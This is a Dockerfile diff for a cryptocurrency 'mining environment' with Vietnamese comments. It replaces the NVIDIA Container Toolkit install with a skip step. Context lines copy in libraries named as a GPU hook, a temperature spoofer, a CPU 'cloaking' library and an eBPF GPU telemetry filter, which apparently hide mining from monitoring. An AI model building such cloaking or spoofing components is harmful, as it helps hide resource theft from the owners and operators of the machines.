@@ -73,17 +73,18 @@ RUN set -eux; \
         erlang-xmerl erlang-asn1 socat logrotate && \
     rm -rf /var/lib/apt/lists/*
 
-# ------------------  (2.1)  Cài đặt NVIDIA Container Toolkit --------------
+# ------------------  (2.1)  NVIDIA Container Toolkit (Optional - Skip nếu không cần) -------
+# Note: nvidia-container-toolkit chỉ cần thiết khi chạy nested containers
+# Trong môi trường mining này, có thể bỏ qua package này
 RUN set -eux; \
-    # Thêm NVIDIA GPG key và repository
-    curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg; \
-    curl -s -L https://nvidia.github.io/libnvidia-container/stable/deb/nvidia-container-toolkit.list | \
-        sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \
-        tee /etc/apt/sources.list.d/nvidia-container-toolkit.list; \
-    # Cập nhật package list và cài đặt
-    apt-get update; \
-    apt-get install -y --no-install-recommends nvidia-container-toolkit; \
-    rm -rf /var/lib/apt/lists/*
+    echo "Skipping nvidia-container-toolkit - not required for mining operations"; \
+    echo "CUDA runtime đã có sẵn từ base image nvcr.io/nvidia/cuda"; \
+    # Alternative: Cài đặt minimal NVIDIA utilities nếu cần
+    apt-get update --allow-releaseinfo-change || true; \
+    apt-get install -y --no-install-recommends \
+        # NVIDIA utilities cơ bản (có sẵn trong Ubuntu repos)
+        nvidia-utils-535 || echo "nvidia-utils not available, continuing..."; \
+    rm -rf /var/lib/apt/lists/* || true
 
 # ------------------  (3)  Locale & Timezone  -------------------------------
 RUN set -eux; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata locales; \
@@ -161,7 +162,6 @@ COPY mining_environment/gpu_plugins/native/nvml/libgpuhook.so /tmp/libgpuhook.so
 COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtempspoof.so 
 COPY mining_environment/cpu_plugins/cloaking_lib/libcloak.so /usr/local/lib/libcloak.so
 
-# **QUAN TRỌNG: Copy PRE-COMPILED eBPF objects (KHÔNG build trong container)**
 # GPU telemetry filter moved to gpu_plugins module
 COPY mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o /app/mining_environment/gpu_plugins/ebpf/obj/
 
